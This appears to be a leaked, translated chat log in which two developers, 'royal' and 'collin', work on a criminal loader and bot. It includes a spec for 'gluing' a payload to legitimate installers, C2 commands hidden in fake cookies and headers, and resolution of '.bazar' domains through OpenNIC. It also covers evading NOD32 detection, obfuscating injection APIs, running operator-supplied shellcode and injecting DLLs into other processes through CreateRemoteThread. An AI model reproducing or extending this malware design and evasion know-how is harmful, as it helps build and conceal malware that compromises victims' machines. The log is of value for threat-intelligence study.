[11.08.21 09:52:11] royal: I get name like this. In DllMain via GetModuleFileNameW(hInstDll), didn't work, I get it in the export function via _ReturnAddress/__builtin_return_address(0).
[11.08.21 09:52:39] royal: In my opinion there should be a 100% probability of getting the name.
[11.08.21 09:52:59] collin: you should test with crypto with return address
[11.08.21 09:53:14] royal: Yes.
[11.08.21 09:53:16] collin: does today's build have it already?
[11.08.21 09:53:27] royal: No.
[11.08.21 09:53:47] royal: Even if there was, crypt passes the correct hInsDll
[11.08.21 09:53:52] collin: well, when it's ready, you'll write it down
[11.08.21 09:54:02] royal: It wouldn't come to returnadress.
[11.08.21 09:54:04] collin: we'll do another profile - rundll32 as before, it doesn't return
[11.08.21 09:54:26] collin: add to the logged version to output - which method shows what name
[11.08.21 09:54:48] collin: `it doesn't` - more precisely, it's not regulated here, someone might do it
[11.08.21 09:57:10] collin: how to get to address of function in crypto, then to its name - any ideas?
[11.08.21 09:57:53] collin: I'm thinking to add bk in crypto profile - to pass it in load function parameter, the simplest option
[11.08.21 09:58:13] collin: from load code in arbitrary memory block - can't think of anything yet
[11.08.21 09:58:43] royal: DllMainCRTStartup(HINSTANCE hInst, DWORD dwReason, LPVOID lpvReserved)
[11.08.21 09:58:49] royal: LPVOID lpvReserved here.
[11.08.21 10:03:06] royal: Or into export function, make it one parameter PVOID.
[11.08.21 10:03:26] royal: In future you can pass there anything you need then.

The generic-glue loeder mode.
"Glue" is a solution to combine a payload with masking software - a legitimate application or software installer into a single executable (exe) file. When the executable runs, the payload and the masking software run simultaneously, with both running in the same process (the payload runs in a separate thread).
This mode is a modification of generic mode, with the following changes and additions:
1. Payload in exe format is not used for crypting (gluing).
2. there are two ways of starting executable file obtained as a result of splicing: with launching of masking software and payload, and with launching of payload only.
By default, the payload is launched together with the masking software.
The launch method is specified by the first command line parameter after the slash character: "/%prm_no_soft%", where prm_no_soft is a constant text value which:
- is set at the stage of building of the Loeder BC;
- is set as a parameter during the formation of the final executable file by the "Glue" assembly system;
- is used in the algorithms of the final executive file to determine the way of launching.
As a payload the module of the BC loeder in the dll format acts.
The looder must determine its launch method and terminate (after performing its functionality) depending on it:
- for the "with masking software" method, terminate via return from DllMain().
- for "without masking software" way - termination with ExitProcess().
3. When launched using the method "with masking software", the loider should restart itself using "without masking software" method with the minimum delay from the moment of launch (from 1 to 5 seconds), and then continue further work.
It is obligatory to add the parameter prm_no_soft to the commands for fixing and subsequent restarting of the loeder module (if used).

2. Is there a limit to the size of time-list of 1 step of search strategy? If yes, by what criterion are the addresses removed from it when the limit is reached?
3. How do you send commands to bot (date signatures in keyer) - via cookies/hedders/maybe both of them in one assembly?
4. How are cookie/hedger names formed to pass garbage values and commands to the bot (date signature in loader)?
4.1 Name format (hardcode list dictionary, words+prefixes, random alphanumeric/numeric-letter values generation, etc.)?
4.2 randomness of names - are new ones generated for each query or - is a list of names generated for build/machine/startup - similar to "Fake Cookies" in the group card, then names are selected from that list for the next query?
5. Are garbage cookies or headers generated, or both, or does it depend on how the command is passed to the bot / loader signature?
6. How many garbage cookies/hedders are generated in requests (in what range is a random value)?
7. What format(s) of garbage cookie / header values are used?

[02.09.21 14:08:13] royal: If it start with regsvr32 there command line doesn't matter for me, DllRegisterServer function is considered to start from scratch.
[02.09.21 14:08:40] royal: And the name of the utility that started it is not taken from the command line either.
[02.09.21 14:09:10] royal: It looks on regsvr32 name so DllRegisterServer doesn't even parse command line in any way.
[02.09.21 14:09:20] royal: Only parses if utility is rundll32
[02.09.21 14:11:22] royal: Another way to check, give command getsysteminfo and look command line.

[02.09.21 14:12:51] collin: I don't know why, maybe it has something to do with it
[02.09.21 14:13:58] royal: don't they run ini there like crypt inside crypt?
[02.09.21 14:14:30] royal: Then the command line will be the same as the first one.

[02.09.21 14:19:18] royal: What if I upload a file to the server and set the jpg path
[02.09.21 14:19:32] royal: And compare with crypt.
[02.09.21 14:20:27] royal: Then it will be clear what was cheated on top or not.
[02.09.21 14:21:35] collin: that's a good idea, I'll try it.
[02.09.21 14:23:16] royal: And if the command fails, let's look through error code.
[02.09.21 15:41:34] collin: with combat bot, the situation is not fixed.

[02.09.21 15:43:11] collin: I'll run it again.
[02.09.21 15:43:39] collin: I do this: on VM with Windows firewall I blacklist the current step 1 addresses, launch bot
[02.09.21 15:43:55] collin: wait 12 minutes, then he should find the bazaar
[02.09.21 15:46:00] royal: I'll see how long to wait. I checked the generation at once.
[02.09.21 15:46:26] collin: you check in combat, maybe the partial version works

[02.09.21 15:54:58] royal: Query does not work for getting closest dns servers.
[02.09.21 15:55:36] royal: Maybe service is not working at the moment.
[02.09.21 15:55:47] royal: It does not work in browser either.
[02.09.21 15:55:59] royal: That's why nothing is resolved.

[02.09.21 15:57:46] collin: does it reject blacklisted addresses?

[02.09.21 15:58:30] collin: `Please wait a reasonable amount of time between queries!` - I guess there were a lot of requests from my VPN
[02.09.21 15:59:17] royal: It worked for me now.
[02.09.21 15:59:54] royal: It should work if the query I wrote above works.
[02.09.21 16:00:44] royal: I quit.
[03.09.21 08:59:22] collin: what's your algorithm if request to get dns-servers fails
[03.09.21 08:59:27] collin: this `https://api.opennicproject.org/geoip/?bare&ipv=4&wl=all&res=8`.
[03.09.21 08:59:57] collin: how many attempts to connect to it, at what intervals, are there backup dns servers hardcoded - if it fails to respond?
[03.09.21 09:00:38] collin: is there a check on what he sent - valid addresses or error text
[03.09.21 09:00:40] royal: none. and will not be able to understand anything, will go through the lists again, will reach bazaar, again will request dns servers. so 3 times through all the lists.
[03.09.21 09:01:06] collin: i.e., if he didn't get an answer, step 3 fails?
[03.09.21 09:01:32] royal: Passes in vain.
[03.09.21 09:01:39] collin: that's no good(
[03.09.21 09:02:14] royal: You can add a couple of pre-selected dns addresses
[03.09.21 09:02:21] collin: similar service to get list of dns-servers
[03.09.21 09:02:23] royal: But their work won't be guaranteed
[03.09.21 09:02:28] collin: one or there are others?
[03.09.21 09:02:41] royal: They may not work in one place, and work in another.
[03.09.21 09:02:52] collin: `But there will be no guarantee of their work` - why?
[03.09.21 09:03:09] royal: It's like in russia: in the other country no.
[03.09.21 09:03:10] collin: this is exactly where the guarantee is - you prop up the addresses, check them and update the list once a week
[03.09.21 09:03:23] royal: That's why I request the nearest ip.
[03.09.21 09:03:40] collin: Were there such cases?
[03.09.21 09:03:53] collin: it wouldn't work in one country and would work in another one
[03.09.21 09:04:03] royal: Of course, some procdacs even I had didn't work from Russia
[03.09.21 09:04:23] royal: Can't find the server
[03.09.21 09:04:47] royal: We have to get some ip addresses from u.s.a.
[03.09.21 09:04:53] collin: You have to check them under US address
[03.09.21 09:05:04] royal: Then the probability will be much higher I think.
[03.09.21 09:05:14] royal: And 8 requests like now, only 10.
[03.09.21 09:11:42] collin: you make one query attempt to it?
[03.09.21 09:13:06] royal: One every time before you start resolving the bazaar.
[03.09.21 09:17:36] collin: What's the criterion to determine whether a dns-server will work from the current address or not
[03.09.21 09:17:38] collin: you don't know?
[03.09.21 09:18:05] royal: Send request
[03.09.21 09:18:35] royal: Get error in reply.
[03.09.21 09:18:49] collin: that's understandable
[03.09.21 09:19:02] collin: aren't there any common signs
[03.09.21 09:19:11] royal: It also depends on your internet provider.
[03.09.21 09:19:22] collin: for example if the server is marked ns8.fr.dns.opennic.glue - like it's only for france
[03.09.21 09:19:27] royal: 100% can't be.
[03.09.21 09:22:03] royal: did you get it by request?
[03.09.21 09:22:24] collin: it's on the list
[03.09.21 09:22:27] collin: https://servers.opennicproject.org/
[03.09.21 09:22:30] royal: There you can specify ip to get closest servers as a parameter in request.
[03.09.21 09:22:46] royal: You don't have to use your ip.
[03.09.21 09:23:09] royal: So you can get from USA.
[03.09.21 09:23:18] collin: not all servers are known to work with bazaars
[03.09.21 09:23:40] collin: from this list which by geoIP gives - how many resolves bazaars in average, did not check?
[03.09.21 09:23:58] collin: and isn't there a parameter "only give servers that resolve bazaars"?)
[03.09.21 09:24:07] royal: Yes, some do not, they are removed from the list by the error code.
[03.09.21 09:24:38] royal: maxima that was for all time is 2 of 8 did not resolve.
[03.09.21 09:25:26] royal: There is no parameter "give only servers that resolve bazaars".
[03.09.21 09:26:14] royal: The first time you resolve the first address, everything becomes clear, and they are removed from the list and no longer used, after that the speed of resolving dramatically increases.
[03.09.21 09:26:49] collin: i.e. the answer is not just that the record was not found, but that the domain format is not supported?
[03.09.21 09:27:29] royal: There are DNS error codes there.
[03.09.21 09:28:04] royal: status == ERROR_TIMEOUT || status == DNS_ERROR_RCODE_SERVER_FAILURE
[03.09.21 09:28:17] royal: I'm removing from the list by these codes.
[03.09.21 09:28:23] collin: ok
[03.09.21 09:28:57] royal: status == DNS_ERROR_RCODE_NAME_ERROR
[03.09.21 09:29:26] royal: This code tells me that there is no such a code and I don't go further down the list.
[03.09.21 09:29:34] royal: status == DNS_RCODE_NOERROR
[03.09.21 09:29:46] royal: This code is success.

[07.09.21 10:24:56] collin: log of loeder version 389
[07/09/21 10:34:06] royal: It crashed because there was a bug after I think the cleanup that caused the query header line to be generated with errors.
[07.09.21 10:34:21] royal: That's why 404
[07.09.21 10:37:11] collin: I see, it probably wasn't working originally
[07.09.21 10:38:05] royal: Originally.
[07.09.21 10:38:22] royal: It was revealed on the next build.
[07.09.21 10:38:25] royal: On 390.
[07.09.21 11:12:25] collin: give me info on your BC bot:
[07.09.21 11:12:38] collin: 1) is crt-prolog used (winCRTmain or similar entry point)
2) is there any static import besides kernel32.dll
if so how is it used - is it really working or just for static noise
and what other dlls are in the import
3) the current state of the bot on the static - the result of checking for dincheck
4) is there a build profile with llvm
[07.09.21 11:16:37] royal: 1 - Yes
2 - Yes. Really used.
3 - MSVC - https://dyncheck.com/scan/id/6e0ecf59e4c5562c2db05a89b4b9d621
     Clang - https://dyncheck.com/scan/id/0a2bd5d11650b34a16b3fb225dde30d4
4 - Yes.
[07.09.21 11:17:26] collin: 2 - what other libs?
[07.09.21 11:18:11] royal: Import:
kernel32.dll
ntdll.dll
oleaut32.dll
shlwapi32.dll
user32.dll
version.dll
[07.09.21 11:23:29] collin: and the calls from them are not obfuscated?
[07.09.21 11:24:40] royal: About the command line. I'll put it this way. If there will be one argument in command line, then I look at utility name if regsvr32 export function is considered as DllRegisterServer, if rundll32 StartW. If more than one argument, then by old parsing the command line if the name of the utility running rundll32.
[07.09.21 11:25:01]
[07.09.21 11:25:13] royal: Their calls are not obfuscated.
[07.09.21 11:25:44] royal: like HeapAlloc StrStr lstrcpy etc.
[07.09.21 11:26:15] royal: All kinds of CreateFile WriteProcessMemory and similar are obfuscated, of course.
[07.09.21 11:27:04] collin: about command line, did you see yesterday in delivery?
[07.09.21 11:27:19] royal: It's not for us, it's for those who run it.
[07.09.21 11:27:27] collin: for us for parsing
[07.09.21 11:27:32] collin: they don't care how you run it)
[07.09.21 11:27:49] royal: I wrote above how to do it.
[07.09.21 11:28:05] royal: Then it doesn't matter how they launch.
[07.09.21 11:28:21] royal: utility name is not taken from command line anyway
[07.09.21 11:28:35] royal: regsvr32 must have DllRegisterServer
[07.09.21 11:29:01] royal: If I start with regsvr32 then there is no need to parse command line.
[07.09.21 11:29:19] royal: And from zakrep will be started correctly already.
[07.09.21 11:29:21] collin: `If there will be one argument in command line` - there can be two arguments when starting via rundll32 - spaces are added there like "rundll32 file.dll , Entry"
[07.09.21 11:29:43] royal: This is not a valid startup.
[07.09.21 11:30:00] collin: it can be so at primary startup
[07.09.21 11:30:08] collin: also it could be without comma, it works that way too
[07.09.21 11:30:29] royal: I wrote if there's one argument I think it's an error and look at the utility name.
[07.09.21 11:30:47] royal: If there is more than one and the utility name is rundll32, I pars the old one.
[07.09.21 11:31:01] royal: If default parsing error StartW
[07.09.21 11:32:04] royal: In quotation marks you wrote it as one argument counts.
[07.09.21 11:32:34] royal: I made a mistake. I wrote a bullshit.
[07.09.21 11:32:57] royal: Only if there is more than 1 argument and the utility name is rundll32
[07.09.21 11:33:19] collin: ``If more than one and the name of utility rundll32 I'll parse it by old-style.`` - plus we should consider if first argument is not name of rundll32.exe in any format (short, full, with or without path) - then first argument consider file name
[07.09.21 11:33:32] collin: yes?
[07/09/21 11:35:13] royal: First check for quantity, then check for utility name from command line, and only then prsing if utility name.
[07.09.21 11:35:43] royal: What can file.jpg one two three have?
[07.09.21 11:36:18] royal: This gets the utility name regsvr32 not parsing at all,
[07.09.21 11:36:40] royal: I compare the utility name regsvr32 with file.jpg, not parsing it at all.
[07.09.21 11:38:13] royal: In their case group 19 don't parse at all will always.
[07.09.21 11:38:53] royal: And it will start normally from zakrep, then I will parse.
[07.09.21 11:39:14] royal: There will be more than 1 argument from the scrap.
[07.09.21 11:39:52] collin: okay.
[07.09.21 11:40:49] royal: By the way, when parsing, when more than 1 argument, I don't use first one at all, it's supposed to be name of the utility running.
[07.09.21 11:41:10] royal: You don't need name check step from argument 0.
[07.09.21 11:41:19] royal: It's simple.
[07.09.21 12:44:17] collin: and you use noise activity in loader?
[07.09.21 12:47:37] royal: Is noise activity a left computation?
[07.09.21 12:48:37] collin: yes, as opposed to Sleep downtime - calculations, memory management, etc.
[07.09.21 12:48:42] collin: I gave you a sample
[07.09.21 12:48:52] collin: you have it in your code, but all the outputs are commented out
[07.09.21 12:49:02] royal: Yes.

[07.09.21 12:50:20] royal: Now specifically disabled.
[07.09.21 12:50:40] royal: Didn't test with it for detects after cleaning.

[07.09.21 12:51:05] collin: I'll have to do it in the bot later - I'm working on my terms of reference now.
[07.09.21 12:51:26] royal: In the bot, too.
[07.09.21 12:51:27] collin: have you been cleaning all week?
[07.09.21 12:51:32] royal: The same.
[07.09.21 12:51:35] royal: Yes.
[07.09.21 14:11:28] royal: What should I call integrity level parameter in response to GetSystemInfo anyway?
[07.09.21 14:11:37] royal: lvl will do?
[07.09.21 14:11:55] royal: &lvl=Low Integrity Level for example.
[07.09.21 14:13:21] royal: Test.
[07.09.21 14:13:27] royal: What should I call integrity level parameter in response to GetSystemInfo anyway?
lvl will do?
&lvl=Low Integrity Level for example.
[07.09.21 14:14:32] collin: `IntegrityLevel` - do that for now
[07.09.21 14:15:00] royal: Does case matter?

[08.09.21 09:34:54] royal: so far lucky, when the date changes and, consequently, the signature may not come 404. This is only in the loader bug, so if he had time to download the bot without error will work without problems of course.
[08.09.21 09:39:52] royal: Check the proxy I will send you the build.

[08.09.21 10:25:26] royal: Right. I forgot to change the parmeter there as in bot.
[08.09.21 10:25:57] royal: So it works through proxy, you only need to change one parameter when you open internet session.
[08.09.21 10:45:46] royal: Run this.

[15.09.21 14:25:44] collin: added task 619 in bugtracker
[15.09.21 14:34:10] royal: Did he check his shell code himself?
[15.09.21 14:34:22] royal: Maybe he's killing the program.
[15.09.21 14:35:03] collin: unknown)
[15.09.21 14:35:07] royal: And there's nothing you can do about it.
[15.09.21 14:35:58] royal: If it kills the program there can be no reports.
[15.09.21 14:44:35] collin: And you checked on test shellcode, no report comes down?
[15.09.21 14:46:37] royal: The one with infinite loop?
[15.09.21 14:46:46] royal: Everything hangs there.
[15.09.21 14:47:07] collin: with a message and an infinite loop at the end
[15.09.21 14:47:27] royal: I checked, wrote left and wrong shell code there.
[15.09.21 14:47:31] collin: you don't run it in a separate thread?
[15.09.21 14:47:57] royal: No.
[15.09.21 14:48:32] royal: Because there is no such thing as a timeout for this command.
[15.09.21 14:50:44] royal: Generally, it's better to run shell code in a separate process, so that if everything goes wrong and the bot doesn't.
[15.09.21 14:53:36] royal: Can a tester run this shell code?
[15.09.21 14:53:51] royal: He will immediately see an exception for example.
[15.09.21 14:55:43] royal: Is it a 64 bit bot?
[9/15/21 15:14:33] royal: It hangs.
[15.09.21 15:16:09] collin: try to run it on VM, my main casper jammed everything and my system crashed even)
[15.09.21 15:16:48] royal: I ran it on mine and it hung like yours without return.
[15.09.21 15:17:24] collin: probably have to run in a separate thread
[15.09.21 15:17:27] collin: I'll specify, I'll write.
[15.09.21 15:18:23] royal: Doesn't matter, anyway command is blocking, nothing will go further until executed.
[15.09.21 15:18:50] collin: well, if it's in a separate thread - you run it as in the background, send the report and skip to the next command
[15.09.21 15:18:51] collin: that's how I do it
[15.09.21 15:19:15] collin: new shellcode comes - I check old thread, if it was running and is still active - I forcibly terminate it and create a new one with shk
[15.09.21 15:19:38] royal: You can't go to the next one, or admin will mix up the answers. Or won't accept.
[15.09.21 15:19:55] collin: why?
[15.09.21 15:21:00] royal: It won't.
[15.09.21 15:21:13] royal: But the team blocking by TK.
[15.09.21 15:22:53] collin: blockers only with timeout
[15.09.21 15:22:58] royal: If there shell code will run for 2 days or indefinitely, the bot will wait.
[15.09.21 15:23:48] collin: there's no reason to wait for it, we don't pass output from the shellcode
[15.09.21 15:24:17] royal: They have to transmit it is their task.
[15.09.21 15:24:51] royal: We are not responsible for this code being normal.
[15.09.21 15:25:20] royal: Then to a separate thread and forget about it.
[9/15/21 15:37:13] royal: In next build it will be started in a separate thread and we forget about this thread and don't watch it at all.
[15.09.21 15:38:03] royal: Even if 10 shell codes are empty, there will be 10 threads.
[15.09.21 15:39:53] collin: if there is a separate thread - incorrect shellcode could kill the process anyway, right?
[9/15/21 15:40:37] royal: Of course.
[15.09.21 15:41:06] royal: SEH is used for that.
[15.09.21 15:41:21] royal: To catch a Windows exception.
[15.09.21 15:42:20] royal: When I checked with lefty codes exception was caught and program didn't crash because of it.
[15.09.21 15:42:46] royal: But I think there can be such a bad code that it won't catch it, but it's not sure.
[15.09.21 15:42:47] collin: do you need to link with certain option or turn on exception handlers?
[15.09.21 15:45:38] royal: In the project they are enabled by default.
[15.09.21 15:46:07] royal: /EHsc
[15.09.21 15:46:26] royal: Where "Include C++ exceptions"
[15.09.21 15:46:36] collin: okay, I'll try
[15.09.21 15:46:39] royal: It's only for MSVC
[15.09.21 15:46:57] collin: I just disabled everything in mine, that's why shellcodes drop different bots
[15.09.21 15:47:06] royal: GCC 64 bit supports them too.
[15.09.21 15:47:17] royal: Clang don't remember.
[15.09.21 15:56:42] royal: The compiler always generates code that supports asynchronous structured exception handling (SEH)
[15.09.21 15:57:12] royal: So they always work regardless of C++ exception parameters.
[15.09.21 15:57:25] collin: in clang?
[15.09.21 15:57:50] royal: In MSVC.
[15.09.21 15:58:20] royal: I haven't. I'll give it a try.

[17.09.21 09:17:30] collin: added new task 623
[17.09.21 09:18:17] collin: take care of that first, compared to other tweaks
[17.09.21 09:27:24] royal: Okay. I'll just finish up the noise queries. I've made a separate thread to send requests to legitimate addresses via timeout, like in ToR.
[17.09.21 09:27:47] royal: Through the same internet session.
[17.09.21 09:28:01] collin: just finish them
[17.09.21 09:28:11] collin: I thought it was done, task marked for testing
[17.09.21 09:28:28] royal: testing.
[17.09.21 09:28:38] collin: but the fact that one session for different requests can't scorch more?
[17.09.21 09:28:57] royal: I think on the contrary.
[17.09.21 09:29:12] royal: Why different requests?
[17.09.21 09:29:40] royal: Requests for legitimate adoes are confusing.
[17.09.21 09:29:44] collin: zeus has been complaining lately, he says the bounce is down. I wonder what else it could be because of.
[17.09.21 09:29:54] royal: Both there GET and there GET.

[17.09.21 09:34:36] collin: why disabled?
[17.09.21 09:34:48] royal: NOD 32
[17.09.21 09:35:03] royal: I have not made it stale yet.
[17.09.21 09:35:09] royal: Static detection.
[17.09.21 09:35:30] royal: Now it sticks already.
[17.09.21 09:35:42] royal: You can turn it back on.
[17.09.21 09:35:50] royal: And clean.
[17.09.21 09:37:34] collin: you can't sacrifice functionality because of cleaning
[17.09.21 09:38:26] collin: better to build with static detection, it's less critical
[17.09.21 09:40:00] royal: It's not a victim of functionality.
[17.09.21 09:40:12] royal: It's just different way holoving works.
[17.09.21 09:40:21] royal: And other headers in the query.
[17.09.21 09:41:09] collin: Well, the logic of work has changed, and just the customer says it got worse. Could be a coincidence, of course.
[17.09.21 09:42:43] royal: Now it's already stinking with changes.
[17.09.21 09:43:15] royal: Yesterday he got detected.
[17.09.21 11:54:31] royal: Did you try to run regsvr32.exe file.dll %cmdline%?
[17.09.21 11:54:39] royal: It will give an error.
[17.09.21 11:55:25] royal: It will say it doesn't know that argument if it's different from its native one.
[17.09.21 11:56:39] collin: duplicate please
[17.09.21 11:56:47] royal: Have you tried to run regsvr32.exe file.dll %cmdline%?
It'll give you an error.
It'll say it doesn't know that argument if it's different from its native one.
[17.09.21 11:57:20] royal: That's why I use rundll32 from scratch.
[17.09.21 11:57:33] collin: I work in loader, it restarts itself, in the process, it adds loader parameters after file.dll
[17.09.21 11:59:42] royal: I get an error
[17.09.21 11:59:45] royal: regsvr32.exe .\dl2_x64.dll {0000000}
[17.09.21 11:59:59] royal: Window error at once.
[17.09.21 12:00:18] collin: from command line?
[17.09.21 12:00:25] royal: Invalid parameter.
[17.09.21 12:00:27] royal: Yes.
[17.09.21 12:00:39] collin: got it, I'll check again.
[17.09.21 12:00:45] collin: maybe it fails to start in some conditions
[17.09.21 12:00:55] royal: Invalid command line parameter "-outputFormat"
[17.09.21 12:01:05] collin: I had restart via CreateProcess and run by autorun command in the registry - it works fine
[17.09.21 12:01:12] royal: There are some rules on the arguments.
[17.09.21 12:09:13] royal: This is in powershell
[17.09.21 12:09:23] royal: In cmd.exe it works.
[17.09.21 12:09:41] royal: Probably because of braces in powershell
[17.09.21 12:12:05] royal: Not really. If some unknown argument is given to it -arg or /arg will be an error window.
[17.09.21 12:12:25] royal: Whoever uses arguments should take it into account.
[17.09.21 12:12:58] royal: Just text without - or / at the beginning will work.
[17.09.21 12:13:59] collin: got it
[17.09.21 13:02:49] royal: 11 %runtype% %timeout% %pid% %cmdline%
[17.09.21 13:03:02] royal: %pid% must be on the team?
[17.09.21 13:03:12] royal: There will be 0 where it is not needed.
[17.09.21 13:03:16] royal: Right?
[17.09.21 13:07:57] royal: Test
[17.09.21 13:10:22] collin: yes it always will be
[17.09.21 13:10:31] royal: Test admin won't let me in.
[17.09.21 13:10:37] collin: in all modes except one - ignore value
[17.09.21 13:10:39] royal: Is there a new dll command?
[17.09.21 13:10:59] collin: test admin recently updated with new proto2
[17.09.21 13:11:12] collin: account must be the same
[17.09.21 13:11:19] collin: like on proto2
[17.09.21 13:11:36] collin: no command yet, alphonse is doing
[17.09.21 13:12:28] royal: Got it.
[20.09.21 08:22:33] collin: hi!
[20.09.21 08:22:49] collin: do you already have noise requests working in your build now?
[20.09.21 08:26:50] royal: Hi. They work.
[20.09.21 08:27:03] collin: great!
[20.09.21 08:27:39] collin: also - remember the build state, that was on Thursday, in group 20
[20.09.21 08:28:29] collin: what you wrote about the changes - the peculiarities of the holding, the headers in the queries
[20.09.21 08:28:52] collin: we might have to go back to that configuration if there are any problems
[20.09.21 08:29:14] collin: because the customers confuse me - the senior one said it was bad and his sapp, on the contrary, said good output...
[20.09.21 08:29:47]
[20.09.21 08:30:01] royal: There's nothing there now.
[20.09.21 08:30:19] collin: addresses/servers are down, waiting for admins to fix it
[20.09.21 08:30:27] royal: Got it.
[20.09.21 12:19:43] collin: build groups 19 and 20

-----END PGP MESSAGE-----
[21.09.21 15:00:31] royal: NOD 32 one.
[21.09.21 15:23:45] collin: +
[22.09.21 09:24:30] collin: hi!
[22.09.21 09:24:38] collin: advise on clang build
[22.09.21 09:24:49] collin: `clang++ -std=c++1y -stdlib=libc++ -lc++abi sample.cpp -o sample` - that's how you build
[22.09.21 09:25:04] collin: how to do it in studio with standard clang or llvmo?
[22.09.21 09:25:49] collin: `-stdlib=libc++ -lc++abi` - more about these two options, do you need any additional components?
[22.09.21 09:28:04] royal: -std=c++1y is c++ 14
[22.09.21 09:28:25] royal: This is enabled by default in 2019 studio.
[22.09.21 09:28:57] collin: and in 2015 it is cut down?
[22.09.21 09:29:40] royal: See General->Language Standard
[22.09.21 09:29:49] royal: You got C++ 14 there
[22.09.21 09:30:17] collin: yes, but it seems to be incomplete because I can't compile the project in 2015, only in 2019
[22.09.21 09:30:42] collin: I thought it only affects the msvc compiler
[22.09.21 09:32:33] royal: clang-cl understands almost all parameters from cl
[22.09.21 09:33:27] collin: ``
1>clang-cl : warning : unknown argument ignored in clang-cl: '--stdlib=libc++' [-Wunknown-argument]
1>clang-cl : warning : unknown argument ignored in clang-cl: '--lc++abi' [-Wunknown-argument]
```
[22.09.21 09:33:29] collin: I wrote it like this
[22.09.21 09:35:14] royal: You have to write parmeters there with /
[22.09.21 09:36:12] collin: the same
[22.09.21 09:37:32] royal: Like this /stdlib:libc++ /lc++abi
[22.09.21 09:37:54] royal: clang-cl understands arguments the same way as cl
[22.09.21 09:39:03] collin: ``
1>clang-cl : warning : unknown argument ignored in clang-cl: '--stdlib=libc++' [-Wunknown-argument]
1>clang-cl : warning : unknown argument ignored in clang-cl: '--lc++abi' [-Wunknown-argument]
```
[22.09.21 09:39:23] collin: ```
1>clang-cl : error : no such file or directory: '/stdlib:libc++'
1>clang-cl : error : no such file or directory: '/lc++abi'
```
[22.09.21 09:39:25] collin: now it goes like this
[22.09.21 09:39:42] royal: where did you write that?
[22.09.21 09:39:59] royal: C++->Command String
[22.09.21 09:40:09] royal: In project settings.
[22.09.21 09:40:13] collin: yes
[22.09.21 09:40:22] royal: Additional parameters at the bottom.
[22.09.21 09:41:02] collin: d atam
[22.09.21 09:42:30] royal: Coming up. I'll find a parameter for clang-cl that is used to pass arguments like in regular clang.
[22.09.21 09:45:04] royal: -Xclang -stdlib=libc++
[22.09.21 09:45:16] royal: -Xclang <parameter as in clang>
[22.09.21 09:45:36] royal: -Xclang --lc++abi
[22.09.21 09:48:40] royal: -lc++abi I can't find it on the Internet.
[22.09.21 09:51:57] royal: found /clang:<prameter>
[22.09.21 09:52:22] royal: Like /clang:-stdlib=libc++
[22.09.21 09:53:41] collin: `/clang:-stdlib=libc++` seems to work like this
[22.09.21 09:53:52] collin: only this one has to be installed
[22.09.21 09:59:29] royal: Why? You don't use standard libraries.
[22.09.21 10:01:13] collin: "std::transform" is used, studio says there's no such a library (without including one more header file)
[22.09.21 10:01:31] collin: such function
[22.09.21 10:01:35] collin: I guess it's in libc++
[22.09.21 10:02:19] royal: Then your size will increase 2-3 times
[22.09.21 10:02:38] royal: No substitute?
[22.09.21 10:02:48] collin: yes, it's a separate issue, the size is not important
[22.09.21 10:03:17] royal: Is there no transform in msvc?
[22.09.21 10:03:40] royal: clang-cl uses standard msvc library by default.
[22.09.21 10:03:48] collin: yes, that wasn't the point
[22.09.21 10:04:43] royal: Install clang from msys2
[9/22/221 10:04:59] royal: It's all there. All the libs you want.
[22.09.21 10:05:15] collin: okay, I'll try
[22.09.21 10:12:12] royal: And by the way, clang is linked to gcc standard library by default. That's what you need.
[22.09.21 10:17:16] collin: about the simple loeder that Manuel was asking about
[22.09.21 10:17:50] collin: what's your functionality 1) is there a dll startup 2) file or fileless startup method with drop?
[22.09.21 10:19:23] royal: file launch from temp.
[22.09.21 10:20:20] royal: Running dll also means file-based.
[22.09.21 10:20:56] royal: Change command line for rundll32 regsvr32 or via LoadLibrary, depends on dll.
[22.09.21 10:21:17] collin: load download via URL link?
[22.09.21 10:23:26] royal: Yes.
[22.09.21 10:23:38] royal: Or by multiple and multiple runs.
[22.09.21 10:24:41] royal: I have a question about the dll command. Is the author of the dll responsible for the correct operation of the dll after it is injected? Is it his job to load all the necessary dll into the process to work?
[22.09.21 10:25:27] royal: Our task is only to make an injection into the process run the DllMain and the export function.
[22.09.21 10:27:33] royal: This only concerns injection into someone else's process. In your own process, it's easy to load the necessary libraries via LoadLibrary. And if the author of dll is responsible for it, you don't need to load into your process too.
[22.09.21 10:30:19] royal: So no need to load libraries from dll import into your process?
[22.09.21 10:33:27] collin: just to clarify
[22.09.21 11:42:37] collin: about reflective loading of dll into a process of others - yes, you should take care about it in BC bot
[22.09.21 11:43:15] collin: upload to the host process other libraries that are used in static load import and not loaded into the process yet
[22.09.21 11:44:44] royal: Got it.
[22.09.21 11:45:57] collin: how to make it easier, any thoughts?
[22.09.21 11:46:11] royal: I have two ideas.
[9/22/221 11:47:02] royal: The first one is to allocate memory in somebody else's process, write there a string with the name of the library and call LoadLibrary via CreateRemoteThread
[9/22/221 11:47:22] collin: `https://en.wikipedia.org/wiki/DLL_injection` like the example here?
[9/22/221 11:47:25] royal: But for that you need to create exactly as many threads as you need to load libraries.
[22.09.21 11:47:52] collin: if there are many of them, then there are many calls to CreateRemoteThread, it must be dirty
[9/22/221 11:47:56] royal: Second thought shell code. Also allocate memory but with array of strings.
[22.09.21 11:48:13] royal: Create shell code, which calls LoadLibrary in a loop
[22.09.21 11:48:28] royal: Create a CreateRemoteThread thread with this shell code.
[22.09.21 11:48:48] royal: Then one thread will load everything you need.
[22.09.21 11:49:02] royal: Second option is more preferable.
[22.09.21 11:49:12] royal: But I can't write shell code.
[22.09.21 11:50:20] collin: we can help with shellcode
[22.09.21 11:51:51] collin: elijah uses it for fileless loeder restart, i kermit hugo will also help
[22.09.21 11:52:24] collin: you'll probably need shellcode - to make 2 calls under load
[22.09.21 11:52:35] collin: first a DllMain, then an export-function
[22.09.21 11:52:45] collin: or there is another option?
[22.09.21 11:54:54] royal: you can DllMain through CreateRemoteThread and export one too.
[22.09.21 11:55:24] royal: Find their address in another process and create a thread.
[22.09.21 11:55:24] collin: in one call?
[22.09.21 11:55:38] royal: Two threads.
[22.09.21 11:55:59] royal: After finishing, the second one.
[22.09.21 11:56:37] collin: after the first thread is finished, won't its results be destroyed?
[22.09.21 11:57:14] royal: No. What results could there be?
[22.09.21 11:57:18] royal: DllMain
[22.09.21 11:57:30] royal: By return code we understand whether it is successful or not.
[22.09.21 11:57:44] collin: nobody knows what kind of initialization might be there, maybe he saves stream id and then uses it in export-function
[22.09.21 11:58:01] collin: these calls should preferably be crammed into one thread in series
[22.09.21 11:58:16] collin: look for examples, it must have been done somehow
